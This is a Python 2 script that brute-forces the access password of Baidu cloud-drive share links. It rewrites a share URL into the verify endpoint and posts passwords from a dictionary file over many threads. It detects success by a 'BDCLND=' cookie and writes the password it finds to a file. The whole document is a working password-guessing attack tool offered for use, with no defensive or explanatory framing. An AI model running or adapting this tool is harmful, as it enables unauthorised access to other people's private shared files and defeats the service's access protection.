# !/usr/bin/env python
# -*- encoding: utf-8 -*-

import Queue
import sys
import threading
import time
import optparse
import requests
from lib.consle_width import getTerminalSize


class baiduBrute:
    def __init__(self, target, threads_num):
        self.target = target.replace("link", "verify").replace("init", "verify").strip()
        self.names_file = "./dic.txt"
        self.thread_count = self.threads_num = threads_num
        self.scan_count = self.found_count = 0
        self.lock = threading.Lock()
        self.console_width = getTerminalSize()[0]
        self.console_width -= 2  # Cal width when starts up
        self._load_pass()
        # outfile = target + '.txt' if not output else output
        # self.outfile = open(outfile, 'w')  # won't close manually
        self.headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }

    # 读入队列
    def _load_pass(self):
        self.queue = Queue.Queue()
        with open(self.names_file) as f:
            for line in f:
                sub = line.strip()
                if sub:
                    self.queue.put(sub)

    def _update_scan_count(self):
        self.lock.acquire()
        self.scan_count += 1
        self.lock.release()

    def _print_progress(self):
        self.lock.acquire()
        msg = '%s found | %s remaining | %s scanned in %.2f seconds' % (
            self.found_count, self.queue.qsize(), self.scan_count, time.time() - self.start_time)
        sys.stdout.write('\r' + ' ' * (self.console_width - len(msg)) + msg)
        sys.stdout.flush()
        self.lock.release()

    def _scan(self):
        while self.queue.qsize() > 0:
            payload = self.queue.get(timeout=1.0)
            try:
                res = requests.post(url=self.target, data="pwd=" + payload, headers=self.headers)
                answer = res.headers["set-cookie"]
                if answer:
                    self.lock.acquire()
                    if "BDCLND=" in answer:
                        print "\nOK! password found: " + payload
                        self.found_count += 1
                        f = open("./pass.txt", 'w')
                        f.write(payload + '\n')
                        f.close()
                        # exit(1)
                    else:
                        pass
                    self.lock.release()
            except:
                pass
            self._update_scan_count()
            self._print_progress()
        self._print_progress()
        self.lock.acquire()
        self.thread_count -= 1
        self.lock.release()

    def run(self):
        self.start_time = time.time()
        for i in range(self.threads_num):
            t = threading.Thread(target=self._scan, name=str(i))
            t.setDaemon(True)
            t.start()
        while self.thread_count > 0 and self.found_count == 0:
            time.sleep(0.01)


if __name__ == '__main__':
    parser = optparse.OptionParser('usage: %prog [options] target')
    parser.add_option('-t', '--threads', dest='threads_num',
                      default=10, type='int',
                      help='Number of threads. default = 30')
    parser.add_option('-o', '--output', dest='output', default=None,
                      type='string', help='Output file name. default is {target}.txt')

    (options, args) = parser.parse_args()
    if len(args) < 1:
        parser.print_help()
        sys.exit(0)

    d = baiduBrute(target=args[0],
                   threads_num=options.threads_num, )
    d.run()
